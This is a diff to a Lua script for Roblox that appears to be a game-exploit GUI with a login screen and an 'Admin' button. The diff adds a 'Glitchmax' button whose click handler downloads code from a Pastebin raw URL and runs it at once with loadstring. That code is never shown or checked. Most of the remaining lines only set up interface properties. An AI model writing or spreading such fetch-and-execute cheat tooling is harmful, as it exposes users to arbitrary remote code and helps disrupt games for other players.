@@ -15,6 +15,7 @@ local Password = Instance.new("TextBox")
 local Username = Instance.new("TextBox")
 local LoginButton = Instance.new("TextButton")
 local LoginLabel = Instance.new("TextLabel")
+local Glitchmax = Instance.new("TextButton")
 
 --Properties:
 
@@ -139,6 +140,20 @@ UniversalGUI.Visible = false
 UniversalGUI.Active = true
 UniversalGUI.Draggable = true
 
+Glitchmax.Name = "Glitchmax "
+Glitchmax.Parent = UniversalGUI
+Glitchmax.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Glitchmax.Position = UDim2.new(0, 137, 0, 8)
+Glitchmax.Size = UDim2.new(0, 122, 0, 50)
+Glitchmax.Font = Enum.Font.SourceSans
+Glitchmax.Text = "Glitchmax "
+Glitchmax.TextColor3 = Color3.fromRGB(0, 0, 0)
+Glitchmax.TextSize = 16.000
+Glitchmax.TextWrapped = true
+Glitchmax.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/tzTXmYf2'),true))()
+end)
+
 Admin.Name = "Admin"
 Admin.Parent = UniversalGUI
 Admin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -195,7 +210,7 @@ LoginButton.MouseButton1Down:connect(function()
 		LoginScreen.Visible = false
 		Main.Visible = true
 	end
-	
+
 end)
 
 LoginLabel.Name = "LoginLabel"
